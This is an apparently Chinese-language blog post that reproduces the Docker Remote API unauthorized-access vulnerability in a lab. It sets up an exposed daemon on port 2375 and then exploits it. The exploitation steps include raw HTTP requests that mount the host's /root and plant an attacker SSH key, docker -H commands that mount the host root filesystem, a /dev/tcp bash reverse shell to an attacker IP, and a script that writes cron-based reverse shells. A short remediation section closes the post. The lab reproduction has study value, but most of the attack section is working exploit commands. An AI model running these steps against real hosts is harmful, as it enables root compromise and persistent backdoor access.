---
title: "docker Remote API 未授权访问"
date: 2019-10-20T11:24:15+08:00
draft: false
tags: ['未授权访问']
categories: ['漏洞复现']
---
复现未授权漏洞系列
<!--more-->
# 漏洞详情：

Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。

 Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。

# 环境搭建：
## 安装docker：
安装一些必要的系统工具：

```
sudo yum install -y yum-utils device-mapper-persistent-data lvm
```
添加软件源信息：
```
sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
```
更新 yum 缓存：
```
sudo yum makecache fast
```
安装 Docker-ce：
```
sudo yum -y install docker-ce
```
启动 Docker 后台服务
```
sudo systemctl start docker
```
测试运行 hello-world
```
docker run hello-world
```
完成图：
![1.jpg](https://ae01.alicdn.com/kf/Uabb53632bc794b51a6b550d5059c18cch.jpg)

## 修改配置文件：
```
vi  /lib/systemd/system/docker.service
```
修改dockerd启动参数，使其绑定在0.0.0.0上，导致未授权任意访问。
![2.jpg](https://ae01.alicdn.com/kf/U5edded7756114b76ad3864f138d3105as.jpg)

然后执行：

```
systemctl daemon-reload      ///重新加载某个服务程序的配置文件

systemctl restart docker.service     //重启docker服务
```
如果没有错误提示，则表示 dockerd 已经成功监听，可以通过如下命令进行验证：
```
curl "http://127.0.0.1:2375/v1.25/info"
```
测试截图：
![3.jpg](https://ae01.alicdn.com/kf/Uc47f3c990f3a4ef183d7a19aa06a9d48J.jpg)

**此处是为了复现此漏洞，所以这么修改。真实生产环境一定不要这么该配置！！！！**

拉取一个镜像：

```
docker pull ubuntu:18.04
```
利用拉取的镜像创建个容器：
```
docker run -d ubuntu:18.04 /bin/bash -c 'while true; do sleep 1; done'
```
参考：
![4.jpg](https://ae01.alicdn.com/kf/Udc44d80c68cf4b2d8fe38a972bb191d9e.jpg)

# 漏洞复现：
## 浏览器直接访问：
(1)  获取 docker 信息：

[http://172.26.1.97:2375/info](http://172.26.1.97:2375/info)

![5.jpg](https://ae01.alicdn.com/kf/Ueb6f622706f448dd8dd6fea1f03de2803.jpg)

(2)  获取image列表：

[http://172.26.1.97:2375/images/json](http://172.26.1.97:2375/v1.25/images/json)

![6.jpg](https://ae01.alicdn.com/kf/U0a1a57e6d75941b0b31b2888cf048a71t.jpg)



(3)  获取容器信息：

[http://172.26.1.97:2375/containers/json](http://172.26.1.97:2375/containers/json)

![7.jpg](https://ae01.alicdn.com/kf/Uf6ff65134f7c4167b8870f3e87040c2eE.jpg)


(4)  设置免登陆，获取服务器权限（当然得root权限启动docker）

原理：

利用接口创建一个新的容器，将宿主机的 /root/ 目录挂载到容器中，本例中是 /tmp 目录，然后将攻击机的 key (id_rsa.pub) 写入 /tmp/.ssh/authorized_keys 中，也就是写入到了宿主机的 /root/.ssh/authorized_keys 中，然后启动新创建的容器，就可以实现免登陆，从攻击机可以直接登录到靶机

  a.创建容器

```
POST /containers/create HTTP/1.1
Host: 172.26.1.97:2375
Content-Type: application/json
cache-control: no-cache
Postman-Token: 7abe8d48-2e9d-4245-a7a4-dbd66279705e
{
 "Image":"ubuntu:18.04",
 "HostConfig":{
 "Binds":[
 "/root/:/tmp/:rw" 
 ]
 },
 "CMD":[
 "/bin/sh",
 "-c",
 "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC6kYan1DO/mcdvu8WcYvmXbEh4WzHqy9k0yeoN0AY40Gg2tnP9TTDMHUWwT5EZk4+hkL7UMr+CMhjnqucZKX5Yw/GhF3kwQZN/NCu3GtJ3/Abl6G6y3J4ej0Q85kFPnPyIM5ZRygTqq728HaHWDgqwjqSG35Dh7pjuvIV8ULuekYpeFN607bEZ0lM3vt3/Kf/fBZQseZYSoj4/S+hWTmVivDThBGECcbCEpVACX3LLSqMvYEURUlEbE+f9qpLV1y7rSIQNJu3VsitHy2m7TAxScxAYsu3MhJFWYQVUZOlUEatW0Q3Ch9iLvD/H5rnBe+ps6088sp/P0CgzrElPChZ root@kali' >> /tmp/.ssh/authorized_keys"
 ]
}------WebKitFormBoundary7MA4YWxkTrZu0gW-- 
```
创建成功：
![8.jpg](https://ae01.alicdn.com/kf/U601ca3765d9948b881d416ad2db51de8t.jpg)

返回了 containers ID

```
{"Id":"28f2c8024538b93ed26a7ffadf9bce86b0361139947e8fb71767d2fa0d3e2b79","Warnings":[]}
```
  b.获取container的信息检查一下是否有问题，这一步可以略过：
![9.jpg](https://ae01.alicdn.com/kf/Ude68ad19c7a14ec99a3f8c9bb58a608aP.jpg)

  c.定是要先attach，再start，这样就可以捕获到输出:

attach包：

```
POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/attach?stderr=1&stdin=1&stdout=1&stream=1 HTTP/1.1
Host: 172.26.1.97:2375
User-Agent: Docker-Client/1.7.0 (windows)
Content-Length: 0
Content-Type: application/json
Accept-Encoding: gzip
```
start包：
```
POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/start HTTP/1.1
Host: 172.26.1.97:2375
User-Agent: Docker-Client/1.7.0 (windows)
Content-Length: 0
Content-Type: application/json
Accept-Encoding: gzip
```
以上利用参考乌云漏洞库：[新浪微博docker](http://www.anquan.us/static/bugs/wooyun-2016-0209856.html)[ remote API](http://www.anquan.us/static/bugs/wooyun-2016-0209856.html)[未授权](http://www.anquan.us/static/bugs/wooyun-2016-0209856.html)[访问导致远程命令执行(root)](http://www.anquan.us/static/bugs/wooyun-2016-0209856.html)
 不知道为什么我做到start那一步就是成功不了，所以我只好换使用docker命令来执行：

## 使用docker命令连接：
(1)  连接未授权机器，查看版本信息：
```
docker -H tcp://172.26.1.97:2375 version
```
查看其docker版本信息：
![10.jpg](https://ae01.alicdn.com/kf/U0df2781528ef497588479d2d8a4b30ade.jpg)

(2)  查看目标机器的镜像：

```
docker -H tcp://172.26.1.97:2375 images
```
截图：
![11.jpg](https://ae01.alicdn.com/kf/U32623262ed63424282d7f194bc01cb1bM.jpg)

(3)  查看目标机器的容器：

```
docker -H tcp://172.26.1.97:2375 ps
```
截图：

![1.jpg](https://ae01.alicdn.com/kf/Uba9d196291f44c99bc37d8c1d2008fc9p.jpg)

start 启动一个已经停止的容器

attach 连接一个已经停止的容器

(4)  新运行一个容器并将entrypoint设置为/bin/bash或者/bin/sh，挂载点设置为服务器的根目录挂载至/tmp目录下（需要root权限启动docker）

```
docker -H tcp://172.26.1.97:2375 run -it -v /:/tmp --entrypoint /bin/sh ubuntu:18.04
```
截图：
![12.jpg](https://ae01.alicdn.com/kf/Uba3fd4312fe14205afff8c2f0c82df32y.jpg)

尝试连接：
![13.jpg](https://ae01.alicdn.com/kf/Ue49efbdf519d42ff9efebbcb3d0e8231g.jpg)

当然我们也可以进行其他操作，linux下反弹shell的方法都可以试试

当目标机器的容器中有bash我们可以直接将entrypoint设置为/bin/bash
![14.jpg](https://ae01.alicdn.com/kf/Uecd9a07cb770454e9177ceb8f5de78f2J.jpg)

反弹shell：

```
bash -i >& /dev/tcp/172.26.1.156/6666 0>&1
```
接收shell：
![15.jpg](https://ae01.alicdn.com/kf/U7b8e78e557b042b5b0d79b2df32fe564o.jpg)



### 可以使用的命令：
```
Commands:
  attach      Attach local standard input, output, and error streams to a running container
  build       Build an image from a Dockerfile
  commit      Create a new image from a container's changes
  cp          Copy files/folders between a container and the local filesystem
  create      Create a new container
  diff        Inspect changes to files or directories on a container's filesystem
  events      Get real time events from the server
  exec        Run a command in a running container
  export      Export a container's filesystem as a tar archive
  history     Show the history of an image
  images      List images
  import      Import the contents from a tarball to create a filesystem image
  info        Display system-wide information
  inspect     Return low-level information on Docker objects
  kill        Kill one or more running containers
  load        Load an image from a tar archive or STDIN
  login       Log in to a Docker registry
  logout      Log out from a Docker registry
  logs        Fetch the logs of a container
  pause       Pause all processes within one or more containers
  port        List port mappings or a specific mapping for the container
  ps          List containers
  pull        Pull an image or a repository from a registry
  push        Push an image or a repository to a registry
  rename      Rename a container
  restart     Restart one or more containers
  rm          Remove one or more containers
  rmi         Remove one or more images
  run         Run a command in a new container
  save        Save one or more images to a tar archive (streamed to STDOUT by def                                                              ault)
  search      Search the Docker Hub for images
  start       Start one or more stopped containers
  stats       Display a live stream of container(s) resource usage statistics
  stop        Stop one or more running containers
  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE
  top         Display the running processes of a container
  unpause     Unpause all processes within one or more containers
  update      Update configuration of one or more containers
  version     Show the Docker version information
  wait        Block until one or more containers stop, then print their exit codes                         
```
## 使用GitHub上的脚本对该漏洞进行利用：
(1)  查看运行的容器：
```
py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375
```
截图:
![16.jpg](https://ae01.alicdn.com/kf/Uf9c0a1658ad14b04b0c3c4c9c94c3b18P.jpg)

(2)  查看所有的容器:

```
py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -a
```
截图：
![17.jpg](https://ae01.alicdn.com/kf/Uddc8fa961ffa4ae9a034c0547b0f6f17W.jpg)

(3)  查看所有镜像：

```
py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -l
```
截图：
![18.jpg](https://ae01.alicdn.com/kf/Ucafb5443dc5544578c5b6fc117d7e624y.jpg)

(4)  查看端口映射：

```
py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -L
```
截图：
![19.jpg](https://ae01.alicdn.com/kf/Ue6d374a459ec492b805ef7f187002ea4L.jpg)

我这里启动的docker并未映射端口，所以返回空白！

(5)  利用脚本写定时任务反弹shell：

```
py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -C -i ubuntu:18.04 -H 172.26.1.156 -P 6666
```
截图：
![20.jpg](https://ae01.alicdn.com/kf/Ue4ba7df9c7644ce58809a55c254c2b9ev.jpg)

(6)  利用脚本写ssh公钥：

编辑脚本

![21.jpg](https://ae01.alicdn.com/kf/Uf30a7ed52d0c4151b02a5dcc2da5c6abP.jpg)

执行脚本：

![22.jpg](https://ae01.alicdn.com/kf/U296d3c4f18544ffe9b2bd40d5fc85a55l.jpg)

登录截图：

![23.jpg](https://ae01.alicdn.com/kf/Ud3b3fa4e60474215811e380f480b2aa1z.jpg)

(7)  在容器中执行命令

先获取到容器id：

![24.jpg](https://ae01.alicdn.com/kf/U2f574c3652a04e5192129371e206364ap.jpg)

然后选取一个容器（需要容器为up状态）进行执行命令：

![25.jpg](https://ae01.alicdn.com/kf/Ucd92b54b539d49939c7b20eaf9a6a6b69.jpg)

(8)  删除容器：

```
py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -c -I a08a888cf9de10f4e5715f4fbf12b0c303b66c5929040cb2029d62b92cc68c4c
```
截图：
![26.jpg](https://ae01.alicdn.com/kf/Ufa99293b893b4b8082203929ff54e5c28.jpg)

(9)  查看服务端api版本：

![27.jpg](https://ae01.alicdn.com/kf/U86c9091bf51c4f538f01bb79de2fa5b1i.jpg)

# 漏洞修复：
(1)  简单粗暴的方法，对2375端口做网络访问控制，如ACL控制，或者访问规则。
(2)  修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。
# 参考链接：
[https://xz.aliyun.com/t/6103#toc-24](https://xz.aliyun.com/t/6103#toc-24)

[http://nsec.top/docker-remote-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/](http://nsec.top/docker-remote-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/)

[http://www.anquan.us/static/bugs/wooyun-2016-0209856.html](http://www.anquan.us/static/bugs/wooyun-2016-0209856.html)

[https://github.com/Tycx2ry/docker_api_vul](https://github.com/Tycx2ry/docker_api_vul)



